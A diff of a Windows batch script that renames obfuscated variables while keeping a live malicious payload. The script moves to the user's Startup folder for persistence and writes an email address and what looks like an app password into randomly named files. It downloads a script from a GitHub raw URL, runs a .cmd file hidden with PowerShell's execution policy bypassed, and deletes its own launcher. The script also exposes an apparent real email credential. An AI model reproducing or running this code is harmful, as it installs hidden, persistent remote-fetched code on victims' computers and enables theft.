@@ -1,9 +1,9 @@
 @echo off
 
-set "fxrDqmXikQJj=%cd%"
-set "cLUqFTIzjSbK=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+set "initial_dir=%cd%"
+set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 
-cd %cLUqFTIzjSbK%
+cd %STARTUP%
 
 echo "goat3dmofo@gmail.com" > PkUbTvqXFIdB.txt
 echo "qcihadixhgspywjw" > NzKnmxLrbsBw.txt
@@ -12,6 +12,6 @@ powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.
 
 powershell -windowstyle hidden -ExecutionPolicy Bypass ./IVbaANzwiphH.cmd
 
-cd "%fxrDqmXikQJj%"
+cd "%initial_dir%"
 
 del initial.cmd
